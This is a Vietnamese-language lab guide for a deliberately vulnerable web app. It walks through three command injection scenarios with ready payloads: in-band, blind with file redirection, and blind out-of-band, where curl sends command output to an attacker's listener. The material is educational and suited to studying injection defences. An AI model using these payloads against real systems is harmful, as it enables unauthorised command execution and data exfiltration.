╔══════════════════════════════════════════════════════════════════╗
║                  TỔNG HỢP 3 KỊCH BẢN TẤN CÔNG                   ║
║              COMMAND INJECTION VULNERABLE WEB APP                ║
╚══════════════════════════════════════════════════════════════════╝

🌐 VICTIM SERVER: http://192.168.11.19
💻 ATTACKER: Kali Linux 192.168.11.21
🎯 MỤC TIÊU: Demonstrate Command Injection Exploitation

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

📋 DANH SÁCH KỊCH BẢN:

┌──────────────────────────────────────────────────────────────────┐
│ KỊCH BẢN 1: IN-BAND COMMAND INJECTION                           │
├──────────────────────────────────────────────────────────────────┤
│ URL        : http://192.168.11.19/product?productId=1            │
│ Chức năng  : Stock Checker (kiểm tra tồn kho)                    │
│ Parameter  : storeId                                             │
│ Đặc điểm   : Output hiển thị TRỰC TIẾP trong response            │
│ File guide : EXPLOIT_SCENARIO_1.txt                              │
│                                                                  │
│ Payload mẫu:                                                     │
│   storeId=1|whoami                                               │
│   → Response: www-data                                           │
└──────────────────────────────────────────────────────────────────┘

┌──────────────────────────────────────────────────────────────────┐
│ KỊCH BẢN 2: BLIND WITH OUTPUT REDIRECTION                       │
├──────────────────────────────────────────────────────────────────┤
│ URL        : http://192.168.11.19/feedback                       │
│ Chức năng  : Feedback Form                                       │
│ Parameter  : email                                               │
│ Đặc điểm   : Output KHÔNG hiển thị, ghi vào file, đọc qua /image│
│ File guide : EXPLOIT_SCENARIO_2.txt                              │
│                                                                  │
│ Payload mẫu:                                                     │
│   email=a||whoami>/var/www/images/output.txt||b                  │
│   → Đọc: http://192.168.11.19/image?filename=output.txt          │
│   → Response: www-data                                           │
└──────────────────────────────────────────────────────────────────┘

┌──────────────────────────────────────────────────────────────────┐
│ KỊCH BẢN 3: BLIND WITH OUT-OF-BAND EXFILTRATION (OOB)           │
├──────────────────────────────────────────────────────────────────┤
│ URL        : http://192.168.11.19/feedback                       │
│ Chức năng  : Feedback Form                                       │
│ Parameter  : email                                               │
│ Đặc điểm   : Output KHÔNG hiển thị, gửi ra Kali Linux           │
│ Yêu cầu    : Kali chạy HTTP listener                             │
│ File guide : EXPLOIT_SCENARIO_3.txt                              │
│                                                                  │
│ Setup:                                                           │
│   Kali: python3 -m http.server 8000                              │
│                                                                  │
│ Payload mẫu:                                                     │
│   email=a||curl http://192.168.11.21:8000/?data=`whoami`||b     │
│   → Kali log: GET /?data=www-data HTTP/1.1                      │
└──────────────────────────────────────────────────────────────────┘

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

📂 CẤU TRÚC FILE:

/var/www/html/
├── index.php                           # Router chính
├── stockreport.pl                      # Script Perl cho KB1
├── EXPLOIT_SCENARIO_1.txt              # Hướng dẫn kịch bản 1
├── EXPLOIT_SCENARIO_2.txt              # Hướng dẫn kịch bản 2
├── EXPLOIT_SCENARIO_3.txt              # Hướng dẫn kịch bản 3
├── README_SCENARIOS.txt                # File này
├── app/
│   ├── controllers/
│   │   ├── ProductController.php       # KB1: In-band injection
│   │   └── FeedbackController.php      # KB2 & KB3: Blind injection
│   └── views/
│       ├── product_detail.php          # Form stock checker
│       ├── feedback.php                # Form feedback
│       └── image_view.php              # File viewer cho KB2
└── public/
    └── images/                         # (Không dùng)

/var/www/images/                        # Thư mục lưu output KB2
├── product1.jpg
├── product2.jpg
└── product3.jpg

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🚀 QUICK START:

┌──────────────────────────────────────────────────────────────────┐
│ KỊCH BẢN 1 (Dễ nhất):                                           │
└──────────────────────────────────────────────────────────────────┘

1. Vào: http://192.168.11.19/product?productId=1
2. Burp intercept request POST /product/stock
3. Payload: storeId=1|whoami
4. Thấy output: www-data


┌──────────────────────────────────────────────────────────────────┐
│ KỊCH BẢN 2 (Trung bình):                                        │
└──────────────────────────────────────────────────────────────────┘

1. Vào: http://192.168.11.19/feedback
2. Burp intercept POST /feedback/send
3. Payload: email=a||whoami>/var/www/images/out.txt||b
4. Đọc: http://192.168.11.19/image?filename=out.txt
5. Thấy: www-data


┌──────────────────────────────────────────────────────────────────┐
│ KỊCH BẢN 3 (Nâng cao):                                          │
└──────────────────────────────────────────────────────────────────┘

1. Kali: python3 -m http.server 8000
2. Vào: http://192.168.11.19/feedback
3. Burp intercept POST /feedback/send
4. Payload: email=a||curl http://192.168.11.21:8000/?d=`whoami`||b
5. Kali log: GET /?d=www-data HTTP/1.1

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

📊 SO SÁNH:

┌──────────────┬─────────────┬──────────────┬─────────────────┐
│              │ KỊCH BẢN 1  │ KỊCH BẢN 2   │ KỊCH BẢN 3      │
├──────────────┼─────────────┼──────────────┼─────────────────┤
│ Loại         │ In-band     │ Blind        │ Blind OOB       │
│ Output       │ Thấy ngay   │ Không thấy   │ Không thấy      │
│ Đọc kết quả  │ Response    │ /image?file  │ Kali listener   │
│ Độ khó       │ Dễ          │ Trung bình   │ Khó             │
│ Yêu cầu      │ Không       │ File viewer  │ Attacker server │
│ Nguy hiểm    │ Cao         │ Rất cao      │ Cực kỳ cao     │
│ Dấu vết      │ Nhiều       │ Ít hơn       │ Ít nhất         │
│ Phát hiện    │ Dễ          │ Khó          │ Rất khó         │
└──────────────┴─────────────┴──────────────┴─────────────────┘

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔧 TOOLS CẦN THIẾT:

✅ Burp Suite Community Edition
✅ Browser với proxy config (Firefox/Chrome)
✅ Kali Linux (cho KB3)
✅ Terminal để chạy commands
✅ Text editor để đọc exploit guides

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

⚠️  TROUBLESHOOTING:

┌──────────────────────────────────────────────────────────────────┐
│ KB1: "stockreport.pl not found"                                 │
└──────────────────────────────────────────────────────────────────┘
→ chmod +x /var/www/html/stockreport.pl

┌──────────────────────────────────────────────────────────────────┐
│ KB2: "File not found - output.txt"                              │
└──────────────────────────────────────────────────────────────────┘
→ sudo chown -R www-data:www-data /var/www/images/
→ Payload phải có format: a||command||b

┌──────────────────────────────────────────────────────────────────┐
│ KB3: "Connection refused" khi curl Kali                         │
└──────────────────────────────────────────────────────────────────┘
→ Kali chưa start listener: python3 -m http.server 8000
→ Firewall Kali: sudo ufw allow 8000
→ Test: ping 192.168.11.21

┌──────────────────────────────────────────────────────────────────┐
│ KB3: "No route to host"                                         │
└──────────────────────────────────────────────────────────────────┘
→ Kiểm tra network mode: Host-Only
→ Cả 2 VM phải cùng subnet: 192.168.11.x

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

📚 HỌC THÊM:

1. PortSwigger Academy: OS Command Injection
   https://portswigger.net/web-security/os-command-injection

2. OWASP: Command Injection
   https://owasp.org/www-community/attacks/Command_Injection

3. HackTricks: Command Injection
   https://book.hacktricks.xyz/pentesting-web/command-injection

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

✅ CHECKLIST HOÀN THÀNH:

☐ KB1: Exploit thành công, thấy output trong response
☐ KB2: Ghi file thành công, đọc được qua /image endpoint
☐ KB3: Kali nhận được data qua HTTP listener

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🎓 TÓM TẮT KỸ THUẬT:

KỊCH BẢN 1: In-band
→ Lệnh thực thi → Output trong response → Thấy ngay

KỊCH BẢN 2: Blind + File Redirection
→ Lệnh thực thi → Output ghi vào file → Đọc qua endpoint khác

KỊCH BẢN 3: Blind + Out-Of-Band
→ Lệnh thực thi → Output gửi ra ngoài → Attacker server nhận

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

Created by: GitHub Copilot
Date: February 10, 2026
Purpose: Educational - Command Injection Demonstration

╚══════════════════════════════════════════════════════════════════╝
